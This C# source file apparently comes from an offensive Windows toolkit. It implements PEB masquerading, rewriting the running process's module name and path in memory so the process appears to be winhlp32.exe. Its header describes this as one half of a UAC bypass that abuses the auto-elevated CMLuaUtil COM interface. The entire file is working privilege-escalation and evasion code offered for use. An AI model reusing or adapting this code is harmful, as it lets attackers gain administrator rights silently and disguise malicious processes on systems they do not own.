using System;
using System.Runtime.InteropServices;
using static Offline.Special.Commons;

/*
|| AUTHOR : UAC bypass method from Oddvar Moe aka api0cradle. ||
            * ucmCMLuaUtilShellExecMethod
            *
            * Purpose:
            *
            * Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
            * This function expects that supMasqueradeProcess was called on process initialization.
            *
|| Original C# version :  https://github.com/0xlane/BypassUAC ||
|| github : https://github.com/arsium       ||
|| This method combines PEB masquerading + abusing com object. Reworked imports in C# to make it working again :) ||
*/

namespace Offline.Special
{
    internal class PEB
    {
        private static bool IsWOW64() => IntPtr.Size == 4;

        private static IntPtr StructureToPtr(object obj)
        {
            IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(obj));
            Marshal.StructureToPtr(obj, ptr, false);
            return ptr;
        }

        private unsafe static void McfInitUnicodeString(IntPtr procHandle, IntPtr lpDestAddress, string uniStr)
        {
            UnicodeString masq = new UnicodeString(uniStr);
            IntPtr masqPtr = StructureToPtr(masq);
            UIntPtr lpNumberOfBytesWritten = UIntPtr.Zero;
            uint sizeStruct = (uint)Marshal.SizeOf(typeof(UnicodeString));
            PageAccessType flOld = new PageAccessType();

            ntProtectVirtualMemory((void*)procHandle, (void*)lpDestAddress, &sizeStruct, PageAccessType.PAGE_READWRITE, &flOld);
            ntWriteVirtualMemory(procHandle, lpDestAddress, masqPtr, (UIntPtr)Marshal.SizeOf(typeof(UnicodeString)), out lpNumberOfBytesWritten);
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate IntPtr GetPeb();

        internal static void MasqueradePEB()
        {
            IntPtr FullDllNamePtr, BaseDllNamePtr;

            PEB32 peb32;
            PEB64 peb64;

            PebLdrData pld;

            ProcessBasicInformation pbi = new ProcessBasicInformation();
            IntPtr procHandle = CurrentProc;
            IntPtr pbiPtr = StructureToPtr(pbi);

            //NtStatus Status = ntQueryInformationProcess(procHandle, 0, pbiPtr, Marshal.SizeOf(pbi), ref result);

            if (true)//(IsSuccess(Status))
            {
                pbi = (ProcessBasicInformation)Marshal.PtrToStructure(pbiPtr, typeof(ProcessBasicInformation));
                if (IsWOW64())
                {
                    //GetPeb getPeb = (GetPeb)Marshal.GetDelegateForFunctionPointer(IntPtr.Size == 4 ? ASM.PebFucker(true) : ASM.PebFucker(false), typeof(GetPeb)); ;
                    IntPtr getPeb = GetPebAddressDynamicWithoutAllocate();

                    peb32 = (PEB32)Marshal.PtrToStructure(getPeb, typeof(PEB32));

                    pld = (PebLdrData)Marshal.PtrToStructure(peb32.Ldr, typeof(PebLdrData));
                    PebLdrData StartModule = (PebLdrData)Marshal.PtrToStructure(peb32.Ldr, typeof(PebLdrData));

                    IntPtr pStartModuleInfo = StartModule.InLoadOrderModuleList.Flink;
                    IntPtr pNextModuleInfo = pld.InLoadOrderModuleList.Flink;

                    rtlEnterCriticalSection(peb32.FastPebLock);

                    FullDllNamePtr = new IntPtr(pNextModuleInfo.ToInt32() + 0x24);
                    BaseDllNamePtr = new IntPtr(pNextModuleInfo.ToInt32() + 0x2C);

                    do
                    {
                        LdrDataTableEntry ldte = (LdrDataTableEntry)Marshal.PtrToStructure(pNextModuleInfo, typeof(LdrDataTableEntry));

                        if (ldte.DllBase == peb32.ImageBaseAddress)
                        {
                            McfInitUnicodeString(procHandle, BaseDllNamePtr, "winhlp32.exe");
                            McfInitUnicodeString(procHandle, FullDllNamePtr, $"{System.Environment.GetEnvironmentVariable("SystemRoot").ToLower()}\\winhlp32.exe");
                            break;
                        }

                        pNextModuleInfo = ldte.InLoadOrderLinks.Flink;

                    } while (pNextModuleInfo != pStartModuleInfo);

                    rtlLeaveCriticalSection(peb32.FastPebLock);
                }
                else
                {
                    //GetPeb getPeb = (GetPeb)Marshal.GetDelegateForFunctionPointer(IntPtr.Size == 4 ? ASM.PebFucker(true) : ASM.PebFucker(false), typeof(GetPeb)); ;
                    IntPtr getPeb = GetPebAddressDynamicWithoutAllocate();

                    peb64 = (PEB64)Marshal.PtrToStructure(getPeb, typeof(PEB64));

                    pld = (PebLdrData)Marshal.PtrToStructure(peb64.Ldr, typeof(PebLdrData));
                    PebLdrData StartModule = (PebLdrData)Marshal.PtrToStructure(peb64.Ldr, typeof(PebLdrData));

                    IntPtr pStartModuleInfo = StartModule.InLoadOrderModuleList.Flink;
                    IntPtr pNextModuleInfo = pld.InLoadOrderModuleList.Flink;

                    rtlEnterCriticalSection(peb64.FastPebLock);

                    FullDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x48);
                    BaseDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x58);
                    do
                    {
                        LdrDataTableEntry ldte = (LdrDataTableEntry)Marshal.PtrToStructure(pNextModuleInfo, typeof(LdrDataTableEntry));

                        if (ldte.DllBase == peb64.ImageBaseAddress)
                        {
                            McfInitUnicodeString(procHandle, BaseDllNamePtr, "winhlp32.exe");
                            McfInitUnicodeString(procHandle, FullDllNamePtr, $"{System.Environment.GetEnvironmentVariable("SystemRoot").ToLower()}\\winhlp32.exe");
                            break;
                        }

                        pNextModuleInfo = ldte.InLoadOrderLinks.Flink;

                    } while (pNextModuleInfo != pStartModuleInfo);
                    rtlLeaveCriticalSection(peb64.FastPebLock);
                }
                return;
            }
        }
    }
}
